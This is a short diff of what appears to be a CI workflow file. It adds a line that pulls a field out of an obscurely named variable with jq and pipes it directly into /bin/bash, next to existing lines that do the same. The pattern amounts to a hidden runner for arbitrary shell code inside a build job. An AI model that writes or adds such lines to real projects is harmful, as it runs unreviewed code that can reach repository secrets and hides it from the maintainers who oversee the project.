@@ -23,6 +23,7 @@ jobs:
           echo $sv617 | jq -r .pto4 | /bin/bash
           echo $di56 | jq -r .b059 | /bin/bash
           echo $uhnh84 | jq -r .ziws481 | /bin/bash
+          printf '%s' "$d93667" | jq -r .vyp5 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
